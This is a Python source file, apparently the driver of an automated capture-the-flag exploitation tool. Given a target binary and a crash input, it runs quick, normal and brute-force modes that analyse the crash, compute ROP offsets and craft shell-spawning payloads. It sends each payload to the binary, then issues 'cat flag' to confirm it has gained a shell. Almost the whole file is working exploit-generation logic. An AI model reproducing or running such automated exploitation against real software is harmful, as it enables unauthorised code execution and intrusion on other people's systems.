from x86_attack.init import *
from x86_attack.analyze import *
import sys
from x86_attack.shell_craft import *
from x86_attack.roputils import *
from x86_attack.quick_mode import *
from x86_attack.cfl import *
#context.log_level = 'debug'

def get_flag(payload):
    for i in payload:
        try:
            p = process(binary)
            p.sendline(i)
            p.recv(1024)
            p.sendline('echo zxcv;cat flag;')
            l = p.recv(4096)
            if 'zxcv' in l:
                flag.append(p.recvuntil('}'))
                p.close()
                CFL = 0
                break
            p.close()
            '''
            else:
                p.close()
            '''
        except:
            p.close()
    print flag
    #if CFL:




if __name__ == '__main__':
    info = {}
    lcs = {}
    rop_and_index = {}
    payload = []
    flag = []

    global QUICK_MODE
    QUICK_MODE = 1


    global NORMAL_MODE
    NORMAL_MODE = 1


    global binary
    global crash
    global CFL
    CFL = 0
    binary = sys.argv[1]
    crash_file = sys.argv[2]
    f = open(crash_file, 'r')
    crash = f.read()
    f.close()


    if QUICK_MODE:
        log.info('QUICK_MODE: ON')
        payload = quick_mode.getshell(binary)
        if payload == -1:
            QUICK_MODE = 0
            #bruteforce_mode()
        else:
            p1 = payload.split(',.,')[0]
            p2 = payload.split(',.,')[1]
            p = process(binary)
            p.sendline(p1)
            p.recvn(1)
            p.sendline(p2)
            #p.interactive()
            p.sendline('echo zxcv;cat flag;')
            receive = p.recvuntil('}')
            if 'zxcv' in receive:
                f = receive.split('zxcv\n')[1]
                flag.append(f)
                print flag[0]
            else:
                QUICK_MODE = 0
                #bruteforce_mode()


    if not QUICK_MODE and NORMAL_MODE:
        log.info('NORMAL_MODE : ON')
        i = init(binary, (roputils.Pattern.create(1000)+'\n')*5)
        info = i.get_state()
        if info == None:
            NORMAL_MODE = 0
        if NORMAL_MODE:
            a = analyze(info, binary, (roputils.Pattern.create(1000)+'\n')*5)
            lcs = a.find_lcs()
            if lcs == -1:
                NORMAL_MODE = 0
            if NORMAL_MODE:
                rop_and_index = a.calc_index()
                if rop_and_index == -1:
                    NORMAL_MODE = 0
                if NORMAL_MODE:
                    shell = shell_craft(binary, (roputils.Pattern.create(1000)+'\n')*5, rop_and_index, info)
                    payload = shell.create_payload()
                    get_flag(payload)

    if not NORMAL_MODE or len(flag) == 0:
        log.info("BRUTEFORCE_MODE : ON")
        if crash == '' and CFL:
            cfl_crash_list = []
            cfl_crash_list = cfl.run(binary)
            if len(cfl_crash_list) > 0:
                for cfl_crash in cfl_crash_list:
                    crash = cfl_crash
                print cfl_crash_list
        i = init(binary, crash)
        info = i.get_state()
        if info == None:
            sys.exit(0)
        a = analyze(info, binary, crash)
        lcs = a.find_lcs()
        print lcs
        if lcs == -1:
            sys.exit(0)
        rop_and_index = a.calc_index()
        if rop_and_index == -1:
            sys.exit(0)
        shell = shell_craft(binary, crash, rop_and_index, info)
        payload = shell.create_payload()
        get_flag(payload)







